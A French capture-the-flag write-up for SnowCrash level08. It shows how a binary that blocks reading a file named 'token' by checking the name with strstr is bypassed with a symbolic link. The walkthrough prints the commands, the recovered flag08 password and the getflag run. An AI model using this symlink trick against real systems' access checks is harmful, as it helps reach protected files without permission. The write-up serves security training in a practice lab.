# Level08

Encore un binaire:

```bash
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
```

Et un fichier 'token':
```bash
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```

Nous entrons en premier paramètre le fichier 'token':

```bash
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Le binaire nous refuse l'accès au fichier token.

Regardons de plus près...

```bash
level08@SnowCrash:~$ strings ./level08 
...
strstr@@GLIBC_2.0
...
```

Le binaire ne semble ne pas utiliser 'access' ou d'autre fonction de sécurité, mais il utilise 'strstr'

Ce qui veut dire que nous pourrions peut-être contourner la sécurité en changeant le nom du fichier, par un lien symbolique, par exemple:

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/link
level08@SnowCrash:~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean
```

Nous récupérons le mot de passe de flag08 et obtenons le flag:

```bash
flag08@SnowCrash:~$ /bin/getflag
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```